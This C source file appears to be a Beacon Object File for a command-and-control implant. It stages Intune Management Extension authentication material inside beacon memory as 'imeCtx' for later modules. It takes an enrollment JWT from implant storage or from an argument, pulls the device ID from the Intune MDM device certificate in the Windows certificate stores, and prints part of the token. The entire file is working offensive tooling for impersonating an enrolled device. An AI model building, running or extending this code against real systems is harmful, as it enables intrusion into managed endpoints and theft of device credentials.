/* ime_auth.c - store the PoC auth material in beacon KV under "imeCtx".
 *
 *   ime_auth [-t <token>] [iwurl] [devid]
 *
 * no args (or "-"/"kv"): the enrollment token from beacon KV "imeToken"
 * (written by ime_token). "-t <token>": the token ITSELF, hand-fed - the
 * base64url JWT exactly as printed by ime-token / IMEClient token (base64
 * of a base64 would be pointless, the JWT already is ASCII base64url);
 * optional trailing iwurl/devid override the discovery in both forms.
 * iwurl defaults to the
 * Graph discovery stored in imeToken, then imeCtx; devid to imeCtx, then the
 * Intune MDM device-cert CN (crypt32) - a refresh after the first ever auth
 * is `ime-token` + `ime-auth -`. Leading/trailing whitespace and a UTF-8 BOM
 * are trimmed. The block and its strings are heap and intentionally never
 * freed (see imectx.h); re-running replaces the previous value via
 * Get/Remove/Add.
 */
#include "bofapi.h"
#include "imectx.h"
#include "ime_util.h"
#include "print.h"
#include "../common/strutil.h"

/* ---- crypt32: MDM device cert -> Intune device id ------------------------
 * Port of IntuneRestClient.DiscoverIntuneDeviceIdFromCert: scan LocalMachine
 * then CurrentUser "My" for a certificate whose issuer names the Intune MDM
 * device CA; its simple-display subject must parse as a GUID (the CN is the
 * device id). Best-effort: NULL when nothing qualifies. */
#define CERT_STORE_PROV_SYSTEM_W        10u
#define X509_ASN_ENCODING               0x1u
#define PKCS_7_ASN_ENCODING             0x10000u
#define CERT_SYSTEM_STORE_CURRENT_USER  0x00010000u
#define CERT_SYSTEM_STORE_LOCAL_MACHINE 0x00020000u
#define CERT_NAME_SIMPLE_DISPLAY_TYPE   4u
#define CERT_NAME_ISSUER_FLAG           0x1u
#define CERT_NAME_MAX                   128

DECLSPEC_IMPORT void *WINAPI CertOpenStore(unsigned long provider,
    unsigned int encoding, void *reserved, unsigned int flags,
    const void *para);
DECLSPEC_IMPORT int WINAPI CertCloseStore(void *store, unsigned int flags);
DECLSPEC_IMPORT void *WINAPI CertEnumCertificatesInStore(void *store,
                                                          void *prev);
DECLSPEC_IMPORT unsigned int WINAPI CertGetNameStringW(void *cert,
    unsigned int type, unsigned int flags, const void *para, wchar_t *buf,
    unsigned int cch);

/* case-insensitive substring; NUL-terminated wide both */
static const wchar_t *wcs_cistr(const wchar_t *hay, const wchar_t *needle)
{
    const wchar_t *h, *n;
    if (!hay || !needle)
        return 0;
    for (; *hay; hay++) {
        for (h = hay, n = needle;; h++, n++) {
            char hc = (char)*h, nc = (char)*n;
            if (hc >= 'A' && hc <= 'Z')
                hc = (char)(hc - 'A' + 'a');
            if (nc >= 'A' && nc <= 'Z')
                nc = (char)(nc - 'A' + 'a');
            if (!nc)
                return hay;
            if (hc != nc)
                break;
        }
    }
    return 0;
}

static wchar_t *devid_from_cert(void)
{
    static const wchar_t ISSUER[] = L"Microsoft Intune MDM Device CA";
    static const wchar_t STORE[] = L"My";
    unsigned char guid[16];
    wchar_t name[CERT_NAME_MAX];
    void *store, *ctx;
    int pass;

    for (pass = 0; pass < 2; pass++) {
        store = CertOpenStore(CERT_STORE_PROV_SYSTEM_W,
                              X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0,
                              pass ? CERT_SYSTEM_STORE_CURRENT_USER
                                   : CERT_SYSTEM_STORE_LOCAL_MACHINE, STORE);
        if (!store)
            continue;
        ctx = 0;
        while ((ctx = CertEnumCertificatesInStore(store, ctx))) {
            if (!CertGetNameStringW(ctx, CERT_NAME_SIMPLE_DISPLAY_TYPE,
                                    CERT_NAME_ISSUER_FLAG, 0, name,
                                    CERT_NAME_MAX) ||
                !wcs_cistr(name, ISSUER))
                continue;
            if (!CertGetNameStringW(ctx, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0, 0,
                                    name, CERT_NAME_MAX) ||
                guid_from_str(name, guid))
                continue; /* CN must be the device GUID, as in the C# */
            CertCloseStore(store, 0);
            return str_dup(name);
        }
        CertCloseStore(store, 0);
    }
    return 0;
}

enum { TOK_KV = 0, TOK_INLINE = 1 };

static int is_ws(char c)
{
    return c == ' ' || c == '\t' || c == '\r' || c == '\n';
}

/* trim ws both ends + UTF-8 BOM, in place */
static int trimmed(char *s, int len)
{
    int a = 0, e = len, i;
    if (len >= 3 && (unsigned char)s[0] == 0xEF && (unsigned char)s[1] == 0xBB &&
        (unsigned char)s[2] == 0xBF)
        a = 3;
    while (a < e && is_ws(s[a]))
        a++;
    while (e > a && is_ws(s[e - 1]))
        e--;
    for (i = 0; i < e - a; i++)
        s[i] = s[a + i];
    s[e - a] = 0;
    return e - a;
}

void go(char *args, int len)
{
    char *s1, *s2, *s3, *s4;
    char *a_tok = 0, *a_iw = 0, *a_dev = 0;
    char *cur = args;
    int rem = len;
    int mode;
    wchar_t *wiw = 0, *wdev = 0, *wtok = 0;
    char *data = 0;
    int dlen = 0;
    ime_ctx *ctx;
    void *old;
    char head[49];
    int hn = 0;

    /* beacon bof_pack "Z" layout: [u32 byteLen][UTF-16LE] per arg */
    s1 = ime_bof_arg_utf8(&cur, &rem);
    s2 = ime_bof_arg_utf8(&cur, &rem);
    s3 = ime_bof_arg_utf8(&cur, &rem);
    s4 = ime_bof_arg_utf8(&cur, &rem); /* all NULL when absent */

    if (s1 && s1[0] == '-' && s1[1] == 't' && !s1[2]) {
        /* hand-fed token; trailing iwurl/devid optional */
        if (!s2 || !s2[0]) {
            internal_printf("usage: ime-auth -t <token> [iwurl] [devid]");
            printoutput(CALLBACK_ERROR);
            return;
        }
        a_tok = s2;
        a_iw = s3;
        a_dev = s4;
        mode = TOK_INLINE;
    } else {
        /* KV token; bare, "-"/"kv", or positional iwurl/devid overrides */
        if (s1 && ((s1[0] == '-' && !s1[1]) || su_ci_eq(s1, "kv"))) {
            a_iw = s2; /* marker consumed: the tail shifts up one */
            a_dev = s3;
        } else {
            a_iw = s1;
            a_dev = s2;
        }
        mode = TOK_KV;
    }

    /* iwurl: arg, else the token's own discovery (imeToken), else imeCtx */
    if (!a_iw || !a_iw[0]) {
        ime_tok *tokblk = ime_tok_get();
        ime_ctx *cur_ctx = ime_ctx_get();
        if (tokblk && tokblk->iwurl && tokblk->iwurl[0])
            wiw = str_dup(tokblk->iwurl);
        else if (cur_ctx && cur_ctx->iwurl && cur_ctx->iwurl[0])
            wiw = str_dup(cur_ctx->iwurl);
        if (!wiw) {
            internal_printf("ime_auth: no iwurl given and none in imeToken/"
                            "imeCtx - pass the IW url once");
            printoutput(CALLBACK_ERROR);
            return;
        }
    } else if (utf8_to_utf16(a_iw, -1, &wiw) < 0 || !wiw) {
        wiw = 0;
    }
    if (!wiw) {
        internal_printf("ime_auth: iwurl unavailable");
        printoutput(CALLBACK_ERROR);
        return;
    }
    if (a_dev && a_dev[0]) {
        if (utf8_to_utf16(a_dev, -1, &wdev) < 0 || !wdev) {
            internal_printf("ime_auth: bad devid");
            printoutput(CALLBACK_ERROR);
            return;
        }
    } else {
        ime_ctx *cur_ctx = ime_ctx_get();
        if (cur_ctx && cur_ctx->devid && cur_ctx->devid[0])
            wdev = str_dup(cur_ctx->devid);
        if (!wdev)
            wdev = devid_from_cert(); /* MDM cert CN, best-effort */
        if (!wdev) {
            wdev = (wchar_t *)mem_alloc(sizeof(wchar_t));
            if (wdev)
                wdev[0] = 0;
        }
    }

    /* token by source, always landing in `data` (NUL-terminated UTF-8) */
    if (mode == TOK_KV) {
        ime_tok *t = ime_tok_get();
        if (!t) {
            internal_printf("ime_auth: no imeToken KV block - run ime-token");
            printoutput(CALLBACK_ERROR);
            goto fail;
        }
        if (utf16_to_utf8(t->token, -1, &data) < 0 || !data) {
            internal_printf("ime_auth: imeToken conversion failed");
            printoutput(CALLBACK_ERROR);
            goto fail;
        }
        dlen = su_len(data);
    } else {
        int n = su_len(a_tok);
        int i;
        data = (char *)mem_alloc((size_t)n + 1);
        if (!data) {
            internal_printf("ime_auth: out of memory");
            printoutput(CALLBACK_ERROR);
            goto fail;
        }
        for (i = 0; i < n; i++)
            data[i] = a_tok[i];
        data[n] = 0;
        dlen = n;
    }
    dlen = trimmed(data, dlen);
    if (dlen == 0) {
        internal_printf("ime_auth: token is empty");
        printoutput(CALLBACK_ERROR);
        goto fail;
    }
    if (utf8_to_utf16(data, -1, &wtok) < 0 || !wtok) {
        internal_printf("ime_auth: token conversion failed");
        printoutput(CALLBACK_ERROR);
        goto fail;
    }

    ctx = (ime_ctx *)mem_alloc(sizeof(ime_ctx));
    if (!ctx) {
        internal_printf("ime_auth: out of memory");
        printoutput(CALLBACK_ERROR);
        goto fail;
    }
    ctx->magic = IME_CTX_MAGIC;
    ctx->ver = IME_CTX_VER;
    ctx->enrollment = wtok;
    ctx->iwurl = wiw;
    ctx->devid = wdev;
    ctx->flags = IME_CTX_FLAG_NONE;

    old = BeaconGetValue((char *)IME_CTX_KEY);
    if (old)
        BeaconRemoveValue((char *)IME_CTX_KEY);
    if (!BeaconAddValue((char *)IME_CTX_KEY, ctx)) {
        internal_printf("ime_auth: BeaconAddValue failed");
        printoutput(CALLBACK_ERROR);
        return;
    }

    while (hn < dlen && hn < 48)
        head[hn] = data[hn], hn++;
    head[hn] = 0;
    /* block + strings intentionally leaked into beacon KV (see imectx.h) */
    internal_printf(
        "ime_auth: imeCtx stored (%s, token %d chars, head '%s...')\n"
        "  iwurl: %ls\n"
        "  devid: %ls\n",
        mode == TOK_KV ? "KV imeToken" : "inline",
        dlen, head, wiw, wdev ? wdev : L"");
    printoutput(CALLBACK_OUTPUT);
    mem_free(data);
    return;

fail:
    mem_free(wiw);
    mem_free(wdev);
    mem_free(wtok);
    mem_free(data);
}
